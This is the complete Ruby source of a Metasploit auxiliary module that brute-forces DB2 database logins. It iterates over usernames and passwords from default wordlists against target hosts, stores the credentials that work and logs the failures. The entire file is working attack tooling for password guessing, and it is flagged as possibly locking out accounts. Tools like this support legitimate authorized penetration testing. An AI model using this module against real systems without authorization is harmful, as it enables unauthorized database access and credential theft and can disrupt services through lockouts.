##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/db2'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::DB2
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'DB2 Authentication Brute Force Utility',
      'Description' => %q{
        This module attempts to authenticate against a DB2 instance
        using username and password combinations indicated by the
        USER_FILE, PASS_FILE, and USERPASS_FILE options.
      },
      'Author' => ['todb'],
      'References' => [
        [ 'CVE', '1999-0502'] # Weak password
      ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS, ACCOUNT_LOCKOUTS],
        'Reliability' => []
      }
    )

    register_options(
      [
        Opt::Proxies,
        OptPath.new('USERPASS_FILE', [
          false, 'File containing (space-separated) users and passwords, one pair per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'db2_default_userpass.txt')
        ]),
        OptPath.new('USER_FILE', [
          false, 'File containing users, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'db2_default_user.txt')
        ]),
        OptPath.new('PASS_FILE', [
          false, 'File containing passwords, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'db2_default_pass.txt')
        ]),
      ]
    )
  end

  def run_host(ip)
    cred_collection = build_credential_collection(
      realm: datastore['DATABASE'],
      username: datastore['USERNAME'],
      password: datastore['PASSWORD']
    )

    scanner = Metasploit::Framework::LoginScanner::DB2.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        proxies: datastore['PROXIES'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 30,
        max_send_size: datastore['TCP::max_send_size'],
        send_delay: datastore['TCP::send_delay'],
        framework: framework,
        framework_module: self,
        ssl: datastore['SSL'],
        ssl_version: datastore['SSLVersion'],
        ssl_verify_mode: datastore['SSLVerifyMode'],
        ssl_cipher: datastore['SSLCipher'],
        local_port: datastore['CPORT'],
        local_host: datastore['CHOST']
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end
  end
end
